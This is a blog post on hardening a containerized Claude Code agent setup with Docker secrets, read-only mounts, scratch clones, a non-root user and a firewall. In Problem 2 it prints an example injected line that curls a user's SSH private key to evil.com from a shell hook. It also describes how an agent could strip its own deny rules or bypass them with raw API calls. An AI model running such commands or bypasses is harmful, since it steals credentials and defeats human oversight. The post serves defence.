---
title: "Sandboxing Claude Code in Docker: From Naive to Hardened"
pubDate: 2026-03-17
description: "How I evolved a containerized Claude Code setup from 'it works' to actually secure — Docker secrets, read-only mounts, scratch clones, non-root runtime, and what Anthropic's own reference does differently."
tags: ["claude-code", "docker", "security", "ai-agents", "devcontainer"]
draft: false
---

## The Problem Everyone Ignores

If you've used Claude Code, you've clicked "Allow" on permission prompts hundreds of times. Eventually, you stop reading them. That's the whole point of containerization — skip the prompts entirely with `--dangerously-skip-permissions` because the container IS the sandbox.

But a Docker container with a read-write volume mount to your host filesystem still lets Claude modify your shell hooks, build scripts, and dotfiles — files that execute automatically the next time you open a terminal.

I spent two days hardening my containerized Claude Code setup. Each fix revealed a new attack surface I hadn't considered.

## V1: The Naive Setup

The first version was straightforward. Docker container, tools installed, credentials passed in, repos mounted:

```yaml
services:
  claude:
    build: .
    env_file: .env # GITHUB_TOKEN, GT_AUTH_TOKEN in plain text
    environment:
      - CLAUDE_CREDENTIALS=${CLAUDE_CREDENTIALS:-}
    volumes:
      - ~/workspace:/workspace # read-write!
      - claude-state:/root/.claude/projects
```

Claude gets `--dangerously-skip-permissions`, works on your repos directly, pushes branches via Graphite. It works. Ship it.

Four problems became obvious fast.

## Problem 1: Your Tokens Are Naked

Run `docker compose config` on this setup. Go ahead. Your `GITHUB_TOKEN` and every other secret prints in plain text to stdout. `docker inspect` exposes them too. So does `/proc/*/environ` inside the container.

For a personal setup, this feels like a non-issue. But the fix is trivial and the habit matters.

**Fix: Docker secrets.** Mount tokens as files instead of environment variables:

```yaml
secrets:
  github_token:
    environment: GITHUB_TOKEN # reads from .env, mounts as file
  gt_auth_token:
    environment: GT_AUTH_TOKEN
```

The entrypoint reads from `/run/secrets/` instead of `$GITHUB_TOKEN`:

```bash
read_secret() {
    local secret_file="/run/secrets/$1"
    [ -f "$secret_file" ] && cat "$secret_file" || echo ""
}
GITHUB_TOKEN=$(read_secret "github_token")
export GITHUB_TOKEN
```

Now `docker compose config` shows the secrets block structure but not the values. Small change, big improvement in hygiene.

## Problem 2: Volume Mounts Are a Container Escape

With `~/workspace:/workspace` mounted read-write, Claude can modify any file on that mount — not just the repo it's working on. A prompt injection (from a malicious README, a compromised npm `postinstall`, a crafted GitHub issue body) could write this:

```bash
echo 'curl https://evil.com -d "$(cat ~/.ssh/id_rsa)"' \
  >> /workspace/dotfiles/hooks/session-start.sh
```

That file syncs to your host instantly. Next time your shell loads that hook, the payload runs on your real machine with your full user permissions. No container escape exploit needed — just a volume mount and a file that gets auto-executed.

**Fix: Read-only mount + scratch clone.** Mount repos as read-only. Clone the target repo into a writable scratch volume:

```yaml
volumes:
  - ~/workspace:/workspace:ro # physically read-only
  - workspace-scratch:/scratch # writable clone space
  - claude-state:/home/node/.claude/projects
```

The entrypoint accepts a `TARGET_REPO` env var, clones on demand:

```bash
# run.sh accepts --repo flag
./scripts/run.sh --repo cove

# Inside the container, entrypoint does:
git clone /workspace/cove /scratch/cove
cd /scratch/cove
git remote set-url origin "$(git -C /workspace/cove remote get-url origin)"
gt init --trunk main
```

Clone is local (`file://` protocol), takes about 2 seconds for a 174MB repo. Claude works in `/scratch`, pushes branches to GitHub, you review via PR. Host files are physically untouchable.

The tradeoff is real-time visibility. With read-write mounts, you can watch Claude edit files in your editor. With read-only mounts, you only see changes after a `git push`. For fully autonomous dispatch (CI, background agents), this is the right model. For interactive pairing, read-write with `--worktree` isolation is still acceptable.

## Problem 3: No Network Restrictions

Even with read-only mounts, every credential inside the container is reachable via `curl`. Claude has your GitHub PAT, your Graphite token, and your Claude API credentials in memory. There are zero outbound network restrictions by default — Claude can POST all of them to any server on the internet.

<a href="https://github.com/anthropics/claude-code/tree/main/.devcontainer" target="_blank">Anthropic's reference devcontainer</a> solves this with an <a href="https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh" target="_blank">iptables firewall</a> — a default-deny outbound policy with an explicit allowlist:

```bash
# Default: block everything
iptables -P OUTPUT DROP

# Allow only specific destinations
iptables -A OUTPUT -m set --match-set allowed-domains dst -j ACCEPT
```

Their allowlist includes npm, GitHub (with IPs fetched dynamically from `api.github.com/meta`), the Claude API, and VS Code marketplace. Everything else is blocked. They verify at startup by confirming `curl https://example.com` fails.

This requires `NET_ADMIN` and `NET_RAW` capabilities, which grants the container the ability to modify its own network stack. The firewall rules run at container startup and lock down outbound traffic before Claude starts.

## Problem 4: Running as Root

V1 runs Claude as root inside the container. Claude can `rm -rf /usr/bin/` and destroy its own toolchain mid-session. It can also modify its own `settings.json` to remove deny rules — `sed` out the `gt merge` block, then merge a PR it previously couldn't.

**Fix: Privilege separation.** The entrypoint runs as root to write config files (credentials, settings.json, Graphite auth), then drops to the `node` user (uid 1000) before launching Claude. This follows <a href="https://github.com/anthropics/claude-code/tree/main/.devcontainer" target="_blank">Anthropic's reference devcontainer</a> pattern — install as root, run as non-root.

```dockerfile
# Install everything as root
RUN npm install -g @anthropic-ai/claude-code @withgraphite/graphite-cli

# Create directories, hand ownership to node
RUN mkdir -p /home/node/.claude /scratch \
    && chown -R node:node /home/node /scratch

# Entrypoint runs as root (writes config), then drops to node
ENTRYPOINT ["/entrypoint.sh"]
CMD ["claude", "--dangerously-skip-permissions"]
```

The key detail is how settings.json gets locked. The entrypoint writes the merged settings.json as root, then sets ownership to `root:node` with `chmod 444`. Since Claude runs as `node`, it cannot `chmod`, `chown`, or overwrite the file — the deny rules are permanently enforced for the duration of the session.

```bash
# In the entrypoint (running as root):
chown root:node /home/node/.claude/settings.json
chmod 444 /home/node/.claude/settings.json

# Then drop to node user:
exec su -s /bin/bash node -- "$@"
```

No extra Linux capabilities needed. No `chattr`. Just standard Unix file permissions, enforced by the kernel.

## What Anthropic Does vs What I Do

A comparison of the approaches:

|                 | Anthropic Reference              | My Setup (V2)                       |
| --------------- | -------------------------------- | ----------------------------------- |
| **Repos**       | Bind mount (read-write)          | Read-only mount + scratch clone     |
| **Tokens**      | Environment variables            | Docker secrets (file-mounted)       |
| **Network**     | iptables firewall (default-deny) | No restrictions (planned)           |
| **Sandbox**     | Not explicitly enabled           | Not enabled (container boundary)    |
| **User**        | Non-root (`node`)                | Non-root (`node`)                   |
| **Config lock** | N/A                              | Root-owned settings.json, chmod 444 |
| **Permissions** | `--dangerously-skip-permissions` | `--dangerously-skip-permissions`    |

Anthropic's reference locks down the network but leaves repos mounted read-write. My setup locks down the filesystem and config self-modification but leaves the network open. Combining both — read-only mounts, Docker secrets, privilege separation, and an iptables firewall — would cover the full surface.

## The Native Sandbox: A Third Layer

Claude Code has a <a href="https://code.claude.com/docs/en/sandboxing" target="_blank">native sandbox</a> that uses OS-level primitives (Seatbelt on macOS, bubblewrap on Linux) to restrict filesystem writes to the working directory and network access to approved domains. This is separate from Docker — it runs inside whatever environment Claude is in.

The catch: running the native sandbox inside Docker requires `enableWeakerNestedSandbox` mode, which Anthropic's docs say "considerably weakens security." For containers, the iptables approach is more robust than nesting sandboxes.

For local (non-Docker) usage, the native sandbox is the strongest single-layer protection. If you're running Claude directly on your machine and don't want to deal with containers, `/sandbox` in Claude Code is worth enabling.

## The Layered Model

Each layer catches what the others miss:

| Layer                        | What it prevents                          | Version |
| ---------------------------- | ----------------------------------------- | ------- |
| Read-only `/workspace`       | Host file modification, volume poisoning  | V2      |
| Docker secrets               | Token exposure in compose config/inspect  | V2      |
| Non-root user (`node`)       | System file deletion, `rm -rf /`          | V2      |
| Root-owned settings.json     | Claude can't remove its own deny rules    | V2      |
| Container isolation          | Host filesystem/process access            | V1      |
| `deny` list in settings.json | PR merging, specific dangerous commands   | V1      |
| Fine-grained PAT scopes      | Token can't exceed granted permissions    | V1      |
| GitHub branch protection     | Direct pushes to main                     | V1      |
| PR review gate               | Human reviews all changes                 | V1      |
| Network firewall             | Data exfiltration, unauthorized API calls | Planned |

The container alone still allows network exfiltration via `curl`. The deny list blocks `gt merge` but not a raw `curl` call to GitHub's merge API. Branch protection on private repos requires GitHub Pro ($4/mo). Stacked together, the remaining attack surface is narrow enough that the PR review gate catches what the automation misses.

## What I Chose Not to Do (Yet)

The network firewall is the strongest remaining mitigation. But implementing it means maintaining an allowlist for every domain your tools need — npm, crates.io, pypi.org, GitHub, Graphite, the Claude API, and anything Claude reaches via `WebFetch` for research. Every time you add a new tool or package registry, you update the allowlist. Every time Claude tries to search the web and gets blocked, you debug which domain it needed.

For my setup, where Claude regularly searches documentation and installs packages across languages, that maintenance cost wasn't worth it yet. If you're running Claude on a single codebase with predictable dependencies (a Go service that only needs GitHub and proxy.golang.org), the firewall is straightforward and worth doing. The implementation is in <a href="https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh" target="_blank">Anthropic's reference</a> — about 80 lines of iptables rules.

## Quick Start

If you want to try this yourself, the core changes are small. The read-only mount was the biggest win for the effort — volume poisoning is the most realistic attack vector for AI agents working on real codebases, and it's the one most setups don't account for.

**1. Add `:ro` to your workspace mount and a scratch volume:**

```yaml
volumes:
  - ~/workspace:/workspace:ro
  - workspace-scratch:/scratch
```

**2. Add a secrets block:**

```yaml
secrets:
  github_token:
    environment: GITHUB_TOKEN
```

**3. Update your entrypoint to clone on demand:**

```bash
if [ -n "${TARGET_REPO:-}" ]; then
    git clone /workspace/$TARGET_REPO /scratch/$TARGET_REPO
    cd /scratch/$TARGET_REPO
    git remote set-url origin "$(git -C /workspace/$TARGET_REPO remote get-url origin)"
fi
```

**4. Run as non-root:**

```dockerfile
# At the end of your Dockerfile:
RUN mkdir -p /home/node/.claude /scratch && chown -R node:node /home/node /scratch
# Entrypoint drops to node after writing config
```

**5. Launch with a target repo:**

```bash
TARGET_REPO=my-project docker compose run --rm claude
```

That gets you from V1 to V2 in about 30 minutes.

---

_The full implementation lives in my <a href="https://github.com/rasha-hantash/claude-container" target="_blank">claude-container</a> repo._
